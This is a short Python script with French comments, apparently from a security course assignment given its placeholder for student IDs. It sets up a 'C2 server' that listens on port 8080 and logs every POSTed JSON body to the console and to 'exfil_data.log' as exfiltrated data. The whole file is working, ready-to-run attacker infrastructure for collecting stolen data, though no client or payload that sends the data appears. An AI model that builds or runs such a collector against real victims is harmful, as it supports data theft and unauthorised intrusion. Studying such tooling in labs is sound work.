# How-To: Serveur C2 simple pour recevoir données exfiltrées
# Lancer avec : python3 c2_server.py
# Écoute sur port 8080, log les POST dans console et fichier
# Matricules: [INSÉRER TES MATRICULES ICI]

import http.server
import socketserver
import json
import datetime

PORT = 8080
LOG_FILE = "exfil_data.log"

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        try:
            data = json.loads(post_data)
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] Données reçues: {json.dumps(data, indent=4)}\n"
            print(log_entry)
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        except Exception as e:
            print(f"Erreur: {e}")
            self.send_response(500)
            self.end_headers()

with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
    print(f"Serveur C2 lancé sur http://192.168.2.154:{PORT}")
    httpd.serve_forever()
